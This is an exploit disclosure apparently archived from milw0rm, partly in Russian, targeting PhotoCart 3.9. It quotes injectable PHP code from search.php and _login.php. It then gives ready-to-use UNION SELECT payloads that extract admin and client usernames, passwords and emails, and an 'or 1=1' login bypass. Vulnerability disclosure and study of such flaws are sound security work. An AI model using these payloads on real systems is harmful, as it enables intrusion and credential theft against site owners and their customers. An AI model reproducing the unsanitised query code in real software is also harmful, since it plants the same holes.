<html><head><title>PhotoCart <= 3.9 Multiple Remote SQL Injection Vulnerabilities</title></head><pre>Author: ~!Dok_tOR!~
Date found: 18.08.08
Product: PhotoCart
Version: 3.9 возможно и более ранние версии
Type: Photography Shopping Cart
URL: www.picturespro.com
Vulnerability Class: SQL Injection

/[installdir]/search.php

Vuln code:

PHP:
if($_REQUEST['searchby'] == &quot;qtitle&quot;) {
$gal_where['where'] = &quot;WHERE gal_status='1' AND gal_client!='1 '$and_expire AND gal_title LIKE '%&quot;.$_REQUEST['qtitle'].&quot;%' &quot;;
print &quot;Results for Gallery or event name: &quot;.$_REQUEST['qtitle'].&quot; &quot;;
}
if($_REQUEST['searchby'] == &quot;qid&quot;) {
$gal_where['where'] = &quot;WHERE gal_status='1' AND gal_client!='1 '$and_expire AND gal_id='&quot;.$_REQUEST['qid'].&quot;' &quot;;
print &quot;Results for Gallery or event ID: &quot;.$_REQUEST['qid'].&quot; &quot;;
}
if($_REQUEST['searchby'] == &quot;qdate&quot;) {
$gdate = &quot;&quot;.$_REQUEST['qyear'].&quot;-&quot;.$_REQUEST['qmonth'].&quot;-&quot;.$_REQUEST['qday'].&quot;&quot;;
$gal_where['where'] = &quot;WHERE gal_status='1' AND gal_client!='1 '$and_expire AND gal_date='$gdate' &quot;;
print &quot;Results for Gallery or event date: &quot;.$_REQUEST['qmonth'].&quot;-&quot;.$_REQUEST['qday'].&quot;-&quot;.$_REQUEST['qyear'].&quot; &quot;;
}


magic_quotes_gpc = Off

Example:
http://[server]/[installdir]/search.php

Вводим в поле Gallery or event name:

Exploit 1:

' union select 1,2,3,4,5,concat_ws(0x3a,admin_user,admin_pass),7, 8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,2 5,26 from admin/*



Exploit 2:

' union select 1,2,3,4,5,concat_ws(0x3a,client_name,client_pass,c lient_email),7,8,9,10,11,12,13,14,15,16,17,18,19,2 0,21,22,23,24,25,26 from pc_clients/*



Authentication Bypass SQL Injection

/[installdir]/_login.php

Vuln code:

PHP:
$result = @mysql_query(&quot;SELECT * FROM pc_clients WHERE client_email='&quot;.$_REQUEST['email'].&quot;' AND client_pass='&quot;.$_REQUEST['password'].&quot;'&quot;);


Email Address: 1' or 1=1/*
Password: 1' or 1=1/*

# milw0rm.com [2008-08-21]</pre></html>